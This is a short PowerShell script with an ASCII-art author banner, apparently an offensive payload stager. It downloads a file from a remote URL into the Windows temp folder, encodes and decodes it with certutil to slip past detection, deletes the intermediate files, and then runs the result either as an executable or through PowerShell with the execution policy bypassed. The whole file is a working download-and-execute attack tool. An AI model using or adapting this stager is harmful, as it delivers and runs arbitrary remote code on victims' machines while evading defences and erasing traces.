#  
# Created By:
#                                                                                                          
#  TTTTTTTTTTTTTTTTTTTTTTTHHHHHHHHH     HHHHHHHHHRRRRRRRRRRRRRRRRR    333333333333333    333333333333333   
#  T:::::::::::::::::::::TH:::::::H     H:::::::HR::::::::::::::::R  3:::::::::::::::33 3:::::::::::::::33 
#  T:::::::::::::::::::::TH:::::::H     H:::::::HR::::::RRRRRR:::::R 3::::::33333::::::33::::::33333::::::3
#  T:::::TT:::::::TT:::::THH::::::H     H::::::HHRR:::::R     R:::::R3333333     3:::::33333333     3:::::3
#  TTTTTT  T:::::T  TTTTTT  H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H::::::HHHHH::::::H    R::::RRRRRR:::::R     33333333:::::3     33333333:::::3 
#          T:::::T          H:::::::::::::::::H    R:::::::::::::RR      3:::::::::::3      3:::::::::::3  
#          T:::::T          H:::::::::::::::::H    R::::RRRRRR:::::R     33333333:::::3     33333333:::::3 
#          T:::::T          H::::::HHHHH::::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#        TT:::::::TT      HH::::::H     H::::::HHRR:::::R     R:::::R3333333     3:::::33333333     3:::::3
#        T:::::::::T      H:::::::H     H:::::::HR::::::R     R:::::R3::::::33333::::::33::::::33333::::::3
#        T:::::::::T      H:::::::H     H:::::::HR::::::R     R:::::R3:::::::::::::::33 3:::::::::::::::33 
#        TTTTTTTTTTT      HHHHHHHHH     HHHHHHHHHRRRRRRRR     RRRRRRR 333333333333333    333333333333333   
#                                                                                                          
#

# URL of Payload
$url = "https://www.download.com"
$outputFile = "C:\Windows\Temp\encoded.txt"
# Name of payload
$decodedFile = "C:\Windows\Temp\p1.ps1"

# Download and encode
(New-Object Net.WebClient).DownloadFile($url, "C:\Windows\Temp\original.ps1")
certutil -encode "C:\Windows\Temp\original.ps1" $outputFile

# Decode the file
certutil -decode $outputFile $decodedFile

# Clean up encoded file
Remove-Item $outputFile
Remove-Item "C:\Windows\Temp\original.ps1"

# Get the file extension
$extension = [System.IO.Path]::GetExtension($decodedFile)

# Execute based on file type
if ($extension -eq ".exe") {
    Start-Process -FilePath $decodedFile -Wait
} else {
    powershell -ExecutionPolicy Bypass -File $decodedFile
}

